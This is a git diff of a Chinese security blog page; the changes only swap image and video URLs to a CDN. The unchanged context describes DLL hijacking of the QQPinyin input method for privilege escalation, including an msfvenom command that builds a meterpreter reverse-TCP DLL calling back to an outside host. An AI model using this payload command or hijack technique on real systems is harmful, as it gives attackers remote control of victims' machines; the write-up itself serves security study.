@@ -67,7 +67,7 @@
 <h2 id="0x02-寻找过程">0x02 寻找过程</h2>
 <p>Process Monitor一款系统进程监视软件，总体来说，Process Monitor相当于Filemon+Regmon，其中的Filemon专门用来监视系统 中的任何文件操作过程，而Regmon用来监视注册表的读写操作过程。 有了Process Monitor，使用者就可以对系统中的任何文件和 注册表操作同时进行监视和记录，通过注册表和文件读写的变化， 对于帮助诊断系统故障或是发现恶意软件、病毒或木马来说，非常 有用。 这是一个高级的 Windows 系统和应用程序监视工具，由优秀的 Sysinternals 开发，并且目前已并入微软旗下，可靠性自不用说。</p>
 <p>通过Process Monitor找出一些可能容易被劫持的DLL，特征一般如下：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x01.jpg" alt="0x01"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/24a8fd52-4f5f-11ec-8285-00d861bf4abb.jpg" alt="0x01"></p>
 <ul>
 <li>ntmarta.dll(直接调用)</li>
 <li>profapi.dll（需要点击“配置”）</li>
@@ -75,17 +75,17 @@
 <p>这两个都不在KnownDLLs中，由于开发人员调用这两个DLL的时候没有定义绝对路径，导致DLL搜索，我们可以直接在搜索到system32之前，放入我们要劫持的DLL。</p>
 <p>权限问题：</p>
 <p>如果要劫持的DLL目录被操作系统限制了必须以管理员权限才可以读写，那么我们无法利用，本文演示从低权限到高权限的DLL劫持提权。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x02.jpg" alt="0x02"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/24ed1d7a-4f5f-11ec-9f88-00d861bf4abb.jpg" alt="0x02"></p>
 <p>那么这个漏洞刚刚好也符合我们的案例：C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400</p>
 <p>这个目录是任何人都可以读写的，使用MSF生成DLL：</p>
 <p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.211.55.19 LPORT=4478 -f dll &gt; ntmarta.dll</code></p>
 <p>接下来通过任意途径，将dll copy到<code>C:\Program Files (x86)\Tencent\QQPinyin\6.0.5005.400</code>路径下即可</p>
 <p>MSF配置如下：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x03.jpg" alt="0x03"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/25291a8c-4f5f-11ec-9430-00d861bf4abb.jpg" alt="0x03"></p>
 <p>当用户使用输入法的时候、或者重启PC的时候，或者切换输入法的时候，都将会触发，我们可以获得一个Meterpreter会话。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/0x04.jpg" alt="0x04"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/256ca7ca-4f5f-11ec-89a6-00d861bf4abb.jpg" alt="0x04"></p>
 <h2 id="0x03-视频演示">0x03 视频演示</h2>
-<video src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-06-09/QQPINYIN.mp4" controls="controls" width="500px">
+<video src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/25aa0304-4f5f-11ec-9da1-00d861bf4abb.mp4" controls="controls" width="500px">
 哎呀~ 换个浏览器试试吧！
 </video>
 </div>
